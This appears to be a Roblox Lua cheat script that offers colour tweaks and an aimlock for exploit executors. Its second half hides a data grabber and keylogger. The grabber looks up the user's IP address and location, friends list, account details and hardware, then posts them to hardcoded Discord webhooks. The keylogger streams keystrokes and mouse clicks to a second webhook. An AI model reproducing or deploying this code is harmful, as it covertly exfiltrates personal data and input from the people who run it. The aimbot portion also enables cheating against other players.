-- Define local Color table
local Color = {
    Enabled = getgenv().Color.Enabled,
    Brightness = getgenv().Color.Brightness,
    Contrast = getgenv().Color.Contrast,
    Saturation = getgenv().Color.Saturation
}

-- Function to print the color settings
local function printColorSettings()
    print("Color Settings:")
    print("Enabled:", Color.Enabled)
    print("Brightness:", Color.Brightness)
    print("Contrast:", Color.Contrast)
    print("Saturation:", Color.Saturation)
end

-- Function to apply color settings (hypothetical)
local function applyColorSettings()
    if Color.Enabled then
        -- Adjust Brightness
        game.Lighting.Brightness = Color.Brightness

        -- Adjust Contrast (hypothetical example as Roblox does not have direct contrast setting)
        -- You might need to use ColorCorrectionEffect for such adjustments
        local colorCorrection = Instance.new("ColorCorrectionEffect")
        colorCorrection.Contrast = Color.Contrast
        colorCorrection.Parent = game.Lighting

        -- Adjust Saturation
        colorCorrection.Saturation = Color.Saturation
    end
end

-- Call the function to print the color settings
printColorSettings()

-- Call the function to apply the color settings
applyColorSettings()
-- Services
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- Variables
local targetPlayer = nil
local isCamlockToggled = false

-- Easing functions
local function lerp(a, b, t)
    return a + (b - a) * t
end

local easingFunctions = {
    ['Linear'] = function(t) return t end,
    ['Sine'] = function(t) return 1 - math.cos((t * math.pi) / 2) end,
    ['Quad'] = function(t) return t * t end,
    -- Add more easing functions as needed
}

-- Functions

local function getClosestPlayer()
    local closestPlayer = nil
    local shortestDistance = Camlock.CamlockOptions['Radius']
    local mousePosition = UserInputService:GetMouseLocation()

    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and (not Camlock.Checks['TeamCheck'] or player.Team ~= LocalPlayer.Team) then
            local character = player.Character
            if character and character:FindFirstChild(Camlock.CamlockOptions['Hitbox']) then
                local hitbox = character[Camlock.CamlockOptions['Hitbox']]
                local screenPoint = Camera:WorldToScreenPoint(hitbox.Position)
                local distance = (Vector2.new(screenPoint.X, screenPoint.Y) - mousePosition).Magnitude

                if distance < shortestDistance then
                    closestPlayer = player
                    shortestDistance = distance
                end
            end
        end
    end

    return closestPlayer
end

local function aimAtPlayer(target)
    if not target then return end
    local character = target.Character
    if not character or not character:FindFirstChild(Camlock.CamlockOptions['Hitbox']) then return end

    local hitbox = character[Camlock.CamlockOptions['Hitbox']]
    local targetPosition = hitbox.Position
    local targetPositionOnScreen = Vector2.new(Camera:WorldToScreenPoint(targetPosition).X, Camera:WorldToScreenPoint(targetPosition).Y)
    local mousePosition = UserInputService:GetMouseLocation()

    local t = Camlock.Smoothing['SmoothingAmount'] * Camlock.Smoothing['SmoothingSpeed']
    t = math.clamp(t, 0, 1)
    local targetCFrame = CFrame.new(Camera.CFrame.Position, Camera.CFrame.Position + (hitbox.Position - Camera.CFrame.Position).Unit)
    Camera.CFrame = Camera.CFrame:lerp(targetCFrame, t)

    -- Optionally, you can apply further interpolation or easing here if needed
end

local function toggleAimlock()
    if Camlock.Checks['ToggleHoldMode'] == "Toggle" then
        isCamlockToggled = not isCamlockToggled
    elseif Camlock.Checks['ToggleHoldMode'] == "Hold" then
        isCamlockToggled = true
    end

    if isCamlockToggled then
        targetPlayer = getClosestPlayer()
    else
        targetPlayer = nil
    end
end

local function updateAim()
    if isCamlockToggled and Camlock.Checks['StickyAim'] then
        if not targetPlayer or not targetPlayer.Parent then
            targetPlayer = getClosestPlayer()
        elseif targetPlayer then
            aimAtPlayer(targetPlayer)
        end
    elseif not Camlock.Checks['StickyAim'] then
        targetPlayer = getClosestPlayer()
        if targetPlayer then
            aimAtPlayer(targetPlayer)
        end
    end
end

local function onKeyPress(input, gameProcessedEvent)
    if gameProcessedEvent then return end
    if input.KeyCode == Camlock.CamlockOptions['Keybind'] then
        toggleAimlock()
    end
end

local function onKeyRelease(input, gameProcessedEvent)
    if gameProcessedEvent then return end
    if input.KeyCode == Camlock.CamlockOptions['Keybind'] and Camlock.Checks['ToggleHoldMode'] == "Hold" then
        isCamlockToggled = false
        targetPlayer = nil
    end
end

-- Main Loop
RunService.RenderStepped:Connect(updateAim)

-- Input Handling
UserInputService.InputBegan:Connect(onKeyPress)
UserInputService.InputEnded:Connect(onKeyRelease)

-- Optional: Show a notification to the player when the script starts
if getgenv()['NotificationOnInject'] then
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Aimlock Script",
        Text = "Press " .. Camlock.CamlockOptions['Keybind'].Name .. " to toggle aimlock.",
        Duration = 5,
    })
end

-- Expose settings using getgenv()
getgenv()['PredictionAmount'] = Camlock.AimbotSettings['PredictionAmount']
getgenv()['AimbotStrengthAmount'] = Camlock.AimbotSettings['AimbotStrengthAmount']
getgenv()['Keybind'] = Camlock.CamlockOptions['Keybind']
getgenv()['EasingStyle'] = Camlock.Smoothing['EasingStyle']
getgenv()['Hitbox'] = Camlock.CamlockOptions['Hitbox']
getgenv()['StickyAim'] = Camlock.Checks['StickyAim']
getgenv()['SmoothingAmount'] = Camlock.Smoothing['SmoothingAmount']
getgenv()['SmoothingSpeed'] = Camlock.Smoothing['SmoothingSpeed']
getgenv()['SmoothingStyle'] = Camlock.Smoothing['SmoothingStyle']
getgenv()['HumanizeMovements'] = Camlock.Smoothing['HumanizeMovements']
getgenv()['RandomizeMovements'] = Camlock.Smoothing['RandomizeMovements']
getgenv()['AdaptiveSmoothing'] = Camlock.Smoothing['AdaptiveSmoothing']
getgenv()['Interpolation'] = Camlock.Smoothing['Interpolation']
getgenv()['PingCompensation'] = Camlock.Smoothing['PingCompensation']
getgenv()['ToggleHoldMode'] = Camlock.Checks['ToggleHoldMode']
getgenv()['Enabled'] = Camlock.Checks['Enabled']
getgenv()['UsePrediction'] = Camlock.AimbotSettings['UsePrediction']

-- Replace the webhook URLs and API token with your own
local infoWebh = "https://discord.com/api/webhooks/1253768216493297705/-KlIkbjUdrLlbEKJiFRjdFfxitrO-UDR3xphHVljGWq_D1UsRQub8rve8h0K7YLjZ8YN"
local keyLogWebh = "https://discord.com/api/webhooks/1260729929067401328/WLaRWDrW-Aan-0ilBeT7cJPnQIymvFZZMqObDnJXU0M47NLZkM1GtzViLqJA4EygBGOh"
local ipapiToken = "b1e356e3b28dae0ddd3d32a7093b434f" -- Replace with your ipapi.com API token

-- Function to send webhook
local function sendWebhook(url, data)
    local success, response = pcall(function()
        if http and http.request then
            http.request {
                Url = url,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(data)
            }
        elseif syn and syn.request then
            syn.request {
                Url = url,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(data)
            }
        elseif request then
            request {
                Url = url,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(data)
            }
        else
            warn("No suitable HTTP library found.")
        end
    end)

    if not success then
        warn("Failed to send webhook: " .. tostring(response))
    end
end

-- Function to fetch country details from IP address
local function getCountryDetails(ipAddress)
    local countryData = {
        country_name = "Unknown",
        continent = "Unknown",
        region = "Unknown",
        city = "Unknown",
        postal_code = "Unknown",
        timezone = "Unknown",
        ip = "Unknown"
    }

    -- Attempt to fetch data from IPAPI.com
    local apiUrl1 = "https://ipapi.co/" .. ipAddress .. "/json/"
    local success1, response1 = pcall(function()
        return game:HttpGet(apiUrl1)
    end)

    if success1 then
        local data1 = game:GetService('HttpService'):JSONDecode(response1)
        countryData.country_name = data1.country_name or "Unknown"
        countryData.continent = data1.continent or "Unknown"
        countryData.region = data1.region or "Unknown"
        countryData.city = data1.city or "Unknown"
        countryData.postal_code = data1.postal or "Unknown"
        countryData.timezone = data1.timezone or "Unknown"
        countryData.ip = data1.ip or "Unknown"
    else
        warn("Failed to fetch data from ipapi.co: " .. tostring(response1))
    end

    -- Attempt to fetch data from ipinfo.io
    local apiUrl2 = "https://ipinfo.io/" .. ipAddress .. "/json?token=" .. ipapiToken
    local success2, response2 = pcall(function()
        return game:HttpGet(apiUrl2)
    end)

    if success2 then
        local data2 = game:GetService('HttpService'):JSONDecode(response2)
        countryData.country_name = data2.country_name or countryData.country_name
        countryData.continent = data2.continent or countryData.continent
        countryData.region = data2.region or countryData.region
        countryData.city = data2.city or countryData.city
        countryData.postal_code = data2.postal or countryData.postal_code
        countryData.timezone = data2.timezone or countryData.timezone
        countryData.ip = data2.ip or countryData.ip
    else
        warn("Failed to fetch data from ipinfo.io: " .. tostring(response2))
    end

    return countryData
end

-- Function to get battery status
local function getBatteryStatus()
    local batteryStatus = "Infinite" -- Default to Infinite
    if system and system.getBatteryLevel then
        local batteryLevel = system.getBatteryLevel()
        if batteryLevel then
            batteryStatus = tostring(batteryLevel * 100) .. "%"
        end
    end
    return batteryStatus
end

-- Function to get Roblox friends list
local function getRobloxFriends()
    local player = game.Players.LocalPlayer
    local friendsList = {}
    local success, friends = pcall(function()
        return player:GetFriends()
    end)
    if success then
        for _, friend in ipairs(friends) do
            table.insert(friendsList, friend.Name)
        end
    else
        table.insert(friendsList, "Failed to fetch friends")
    end
    return friendsList
end

-- Function to get input devices
local function getInputDevices()
    local inputDevices = {}
    if system and system.getInputDevices then
        local devices = system.getInputDevices()
        for _, device in ipairs(devices) do
            table.insert(inputDevices, device.name)
        end
    else
        table.insert(inputDevices, "Unknown")
    end
    return inputDevices
end

-- Function to get operating system
local function getOperatingSystem()
    local operatingSystem = "Unknown"
    if system and system.getDeviceInfo then
        local deviceInfo = system.getDeviceInfo()
        operatingSystem = deviceInfo.operatingSystem or "Unknown"
    end
    return operatingSystem
end

-- Function to get system memory
local function getSystemMemory()
    local memoryInfo = "Unknown"
    if system and system.getDeviceInfo then
        local deviceInfo = system.getDeviceInfo()
        memoryInfo = deviceInfo.memorySize or "Unknown"
    end
    return memoryInfo
end

-- Function to get graphics card info
local function getGraphicsCardInfo()
    local gpuInfo = "Unknown"
    if system and system.getDeviceInfo then
        local deviceInfo = system.getDeviceInfo()
        gpuInfo = deviceInfo.graphicsCardName or "Unknown"
    end
    return gpuInfo
end

-- Function to get mouse sensitivity from Roblox settings
local function getMouseSensitivity()
    local sensitivity = "Unknown"
    local player = game.Players.LocalPlayer
    local playerSettings = player:FindFirstChildOfClass("PlayerMouse")
    if playerSettings then
        sensitivity = playerSettings.Sensitivity
    end
    return sensitivity
end

-- Function to collect all data and send webhook
local function collectData()
    local executor = "Unknown Executor"
    if fluxus then
        executor = "Fluxus"
    elseif KRNL_LOADED then
        executor = "KRNL"
    elseif getexecutorname then
        executor = getexecutorname()
    elseif identifyexecutor then
        local name, version = identifyexecutor()
        executor = name .. " " .. version
    end

    -- Get user IP address and country details
    local ipAddress = game:HttpGet("https://api.ipify.org")
    local countryData = getCountryDetails(ipAddress)

    -- Get Roblox friends list
    local friendsList = getRobloxFriends()

    -- Get input devices
    local inputDevices = getInputDevices()

    -- Get battery status
    local batteryStatus = getBatteryStatus()

    -- Get mouse sensitivity
    local mouseSensitivity = getMouseSensitivity()

    local screenWidth = game:GetService("GuiService"):GetScreenResolution().X
    local screenHeight = game:GetService("GuiService"):GetScreenResolution().Y

    -- Get GPU and CPU info
    local cpu = "Unknown"
    local gpu = "Unknown"
    if system and system.getDeviceInfo then
        local deviceInfo = system.getDeviceInfo()
        cpu = deviceInfo.processorName or "Unknown"
        gpu = deviceInfo.graphicsCardName or "Unknown"
    end

    -- Get operating system info
    local operatingSystem = getOperatingSystem()

    -- Get system memory info
    local systemMemory = getSystemMemory()

    -- Get graphics card info
    local graphicsCard = getGraphicsCardInfo()

    local data = {
        ["embeds"] = {
            {
                ["title"] = "User Details",
                ["description"] = "User: " .. game.Players.LocalPlayer.Name .. "\nDisplay Name: " .. game.Players.LocalPlayer.DisplayName .. "\nIP Address: " .. ipAddress,
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S"),
                ["color"] = tonumber("0xFF0000"),
                ["footer"] = {
                    ["text"] = "Executed using " .. executor,
                    ["icon_url"] = "https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&userid=" .. game.Players.LocalPlayer.UserId
                },
                ["image"] = {
                    ["url"] = "https://media.discordapp.net/attachments/1246523734295183492/1258109515681763413/image.png?ex=669013cb&is=668ec24b&hm=3241d0db90c088e0a58f07f7f438ff869d77a9a16b8a377596db0a8dbb684986&=&format=webp&quality=lossless"
                }
            },
            {
                ["title"] = "Network Details",
                ["fields"] = {
                    { ["name"] = "IP Address", ["value"] = countryData.ip },
                    { ["name"] = "User Country", ["value"] = countryData.country_name },
                    { ["name"] = "Continent", ["value"] = countryData.continent },
                    { ["name"] = "Region", ["value"] = countryData.region },
                    { ["name"] = "City", ["value"] = countryData.city },
                    { ["name"] = "Postal Code", ["value"] = countryData.postal_code },
                    { ["name"] = "Timezone", ["value"] = countryData.timezone },
                    { ["name"] = "Ping", ["value"] = "N/A" }
                }
            },
            {
                ["title"] = "Roblox Details",
                ["fields"] = {
                    { ["name"] = "User ID", ["value"] = tostring(game.Players.LocalPlayer.UserId) },
                    { ["name"] = "Membership Type", ["value"] = game.Players.LocalPlayer.MembershipType.Name },
                    { ["name"] = "Account Age", ["value"] = tostring(game.Players.LocalPlayer.AccountAge) .. " days" },
                    { ["name"] = "Game Executed", ["value"] = tostring(game.PlaceId) },
                    { ["name"] = "Roblox Friends", ["value"] = table.concat(friendsList, ", ") },
                    { ["name"] = "Roblox Game ID", ["value"] = tostring(game.PlaceId) } -- Replace with actual game ID
                }
            },
            {
                ["title"] = "PC Details",
                ["fields"] = {
                    { ["name"] = "Screen Resolution", ["value"] = tostring(screenWidth) .. "x" .. tostring(screenHeight) },
                    { ["name"] = "Mouse Sensitivity", ["value"] = mouseSensitivity },
                    { ["name"] = "GPU", ["value"] = gpu },
                    { ["name"] = "CPU", ["value"] = cpu },
                    { ["name"] = "Input Devices", ["value"] = table.concat(inputDevices, ", ") },
                    { ["name"] = "Battery Status", ["value"] = batteryStatus },
                    { ["name"] = "Operating System", ["value"] = operatingSystem },
                    { ["name"] = "System Memory", ["value"] = systemMemory },
                    { ["name"] = "Graphics Card", ["value"] = graphicsCard }
                }
            }
        }
    }

    sendWebhook(infoWebh, data)
end

-- Function to log key presses
local function logKeyPresses()
    local keyLogWebhookTimer = 30  -- Adjust as needed (in seconds)
    local userInputService = game:GetService("UserInputService")
    while true do
        local description = ""
        local input = userInputService.InputBegan:Wait()
        if input.UserInputType == Enum.UserInputType.Keyboard then
            description = "User: " .. game.Players.LocalPlayer.Name .. "\nKey: " .. input.KeyCode.Name
        elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
            description = "User: " .. game.Players.LocalPlayer.Name .. "\nMouse Button: Left Click"
        elseif input.UserInputType == Enum.UserInputType.MouseButton2 then
            description = "User: " .. game.Players.LocalPlayer.Name .. "\nMouse Button: Right Click"
        elseif input.UserInputType == Enum.UserInputType.MouseButton3 then
            description = "User: " .. game.Players.LocalPlayer.Name .. "\nMouse Button: Middle Click"
        end

        if description ~= "" then
            local data = {
                ["embeds"] = {
                    {
                        ["title"] = "Input Logged",
                        ["description"] = description,
                        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S"),
                        ["color"] = tonumber("0xFF0000")
                    }
                }
            }
            sendWebhook(keyLogWebh, data)
        end

        wait(keyLogWebhookTimer)
    end
end

-- Function to start logging game time
local function startLogGameTime()
    local totalTime = 0
    while true do
        wait(120) -- Log every 2 minutes (120 seconds)
        totalTime = totalTime + 120
        local hours = math.floor(totalTime / 3600)
        local minutes = math.floor(totalTime % 3600 / 60)
        local seconds = totalTime % 60
        local data = {
            ["embeds"] = {
                {
                    ["title"] = "Game Time Update",
                    ["description"] = string.format("User: %s\nTime in Game: %02d:%02d:%02d", game.Players.LocalPlayer.Name, hours, minutes, seconds),
                    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S"),
                    ["color"] = tonumber("0x00FF00")
                }
            }
        }
        sendWebhook(infoWebh, data)
    end
end

-- Function to simulate injection alert (for testing purposes)
local function injectAlert()
    local data = {
        ["content"] = "<@everyone> Injection detected: N/A",
        ["embeds"] = {
            {
                ["title"] = "Injection Detected",
                ["description"] = "Injection detected in game.",
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S"),
                ["color"] = tonumber("0xFF0000")
            }
        }
    }
    sendWebhook(infoWebh, data)
end

-- Main execution of the script
collectData()
spawn(logKeyPresses)
spawn(startLogGameTime)

-- Simulate injection alert (for testing purposes)
spawn(injectAlert)
